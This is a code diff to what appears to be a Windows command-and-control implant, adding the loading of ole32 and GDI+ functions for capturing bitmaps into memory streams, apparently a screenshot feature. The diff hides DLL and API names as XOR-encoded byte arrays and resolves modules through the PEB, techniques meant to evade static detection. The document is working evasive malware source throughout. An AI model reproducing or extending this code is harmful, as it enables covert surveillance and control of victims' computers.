@@ -112,6 +112,19 @@ void c2t_win32_api_init(void) {
 
   static const unsigned char enc_winhttp_dll[] = {45, 51, 52, 50, 46, 46, 42, 116, 62, 54, 54};
   static const unsigned char enc_iphlpapi_dll[] = {51, 42, 50, 54, 42, 59, 42, 51, 116, 62, 54, 54};
+  static const unsigned char enc_ole32_dll[] = {53, 54, 63, 105, 104, 116, 62, 54, 54};
+  static const unsigned char enc_gdiplus_dll[] = {61, 62, 51, 42, 54, 47, 41, 116, 62, 54, 54};
+
+  /* ole32 functions */
+  static const unsigned char enc_CreateStreamOnHGlobal[] = {25, 40, 63, 59, 46, 63, 9, 46, 40, 63, 59, 55, 21, 52, 18, 29, 54, 53, 56, 59, 54};
+  static const unsigned char enc_GetHGlobalFromStream[] = {29, 63, 46, 18, 29, 54, 53, 56, 59, 54, 30, 40, 53, 55, 9, 46, 40, 63, 59, 55};
+
+  /* gdiplus functions */
+  static const unsigned char enc_GdiplusStartup[] = {29, 62, 51, 42, 54, 47, 41, 9, 46, 59, 40, 46, 47, 42};
+  static const unsigned char enc_GdiplusShutdown[] = {29, 62, 51, 42, 54, 47, 41, 9, 50, 47, 46, 62, 53, 45, 52};
+  static const unsigned char enc_GdipCreateBitmapFromGdiDib[] = {29, 62, 51, 42, 25, 40, 63, 59, 46, 63, 24, 51, 46, 55, 59, 42, 30, 40, 53, 55, 29, 62, 51, 30, 51, 56};
+  static const unsigned char enc_GdipSaveImageToStream[] = {29, 62, 51, 42, 9, 59, 44, 63, 19, 55, 59, 61, 63, 14, 53, 9, 46, 40, 63, 59, 55};
+  static const unsigned char enc_GdipDisposeImage[] = {29, 62, 51, 42, 30, 51, 41, 42, 53, 41, 63, 19, 55, 59, 61, 63};
 
   /* user32 functions */
   static const unsigned char enc_GetWindowThreadProcessId[] = {29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 50, 40, 63, 59, 62, 10, 40, 53, 57, 63, 41, 41, 19, 62};
@@ -272,7 +285,7 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_wer_dll[] = {45, 63, 40, 104, 62, 54, 54};
   static const unsigned char enc_WerSetFlags[] = {85, 63, 40, 89, 63, 62, 124, 54, 59, 61, 41};
 
-  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32], dll_iphlpapi[32], dll_wer[32], dll_gdi32[32];
+  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32], dll_iphlpapi[32], dll_wer[32], dll_gdi32[32], dll_ole32[32], dll_gdiplus[32];
   c2t_win32_xor_decode(dll_user32, enc_user32_dll, sizeof(enc_user32_dll), 0x5A);
   c2t_win32_xor_decode(dll_kernel32, enc_kernel32_dll, sizeof(enc_kernel32_dll), 0x5A);
   c2t_win32_xor_decode(dll_advapi32, enc_advapi32_dll, sizeof(enc_advapi32_dll), 0x5A);
@@ -282,6 +295,8 @@ void c2t_win32_api_init(void) {
   c2t_win32_xor_decode(dll_iphlpapi, enc_iphlpapi_dll, sizeof(enc_iphlpapi_dll), 0x5A);
   c2t_win32_xor_decode(dll_wer, enc_wer_dll, sizeof(enc_wer_dll), 0x5A);
   c2t_win32_xor_decode(dll_gdi32, enc_gdi32_dll, sizeof(enc_gdi32_dll), 0x5A);
+  c2t_win32_xor_decode(dll_ole32, enc_ole32_dll, sizeof(enc_ole32_dll), 0x5A);
+  c2t_win32_xor_decode(dll_gdiplus, enc_gdiplus_dll, sizeof(enc_gdiplus_dll), 0x5A);
 
   HMODULE hKernel32 = c2t_win32_get_module_peb(L"kernel32.dll");
   if (!hKernel32) hKernel32 = GetModuleHandleA(dll_kernel32);
@@ -318,6 +333,14 @@ void c2t_win32_api_init(void) {
   HMODULE hWer = c2t_win32_get_module_peb(L"wer.dll");
   if (!hWer) hWer = GetModuleHandleA(dll_wer);
   if (!hWer && hKernel32) hWer = LoadLibraryA(dll_wer);
+
+  HMODULE hOle32 = c2t_win32_get_module_peb(L"ole32.dll");
+  if (!hOle32) hOle32 = GetModuleHandleA(dll_ole32);
+  if (!hOle32 && hKernel32) hOle32 = LoadLibraryA(dll_ole32);
+
+  HMODULE hGdiplus = c2t_win32_get_module_peb(L"gdiplus.dll");
+  if (!hGdiplus) hGdiplus = GetModuleHandleA(dll_gdiplus);
+  if (!hGdiplus && hKernel32) hGdiplus = LoadLibraryA(dll_gdiplus);
 
 #define LOAD_API(hMod, field, enc_arr)                                         \
   do {                                                                         \
@@ -489,6 +512,17 @@ void c2t_win32_api_init(void) {
 
   /* wer */
   LOAD_API(hWer, WerSetFlags, enc_WerSetFlags);
+
+  /* ole32 */
+  LOAD_API(hOle32, CreateStreamOnHGlobal, enc_CreateStreamOnHGlobal);
+  LOAD_API(hOle32, GetHGlobalFromStream, enc_GetHGlobalFromStream);
+
+  /* gdiplus */
+  LOAD_API(hGdiplus, GdiplusStartup, enc_GdiplusStartup);
+  LOAD_API(hGdiplus, GdiplusShutdown, enc_GdiplusShutdown);
+  LOAD_API(hGdiplus, GdipCreateBitmapFromGdiDib, enc_GdipCreateBitmapFromGdiDib);
+  LOAD_API(hGdiplus, GdipSaveImageToStream, enc_GdipSaveImageToStream);
+  LOAD_API(hGdiplus, GdipDisposeImage, enc_GdipDisposeImage);
 
 #undef LOAD_API
 
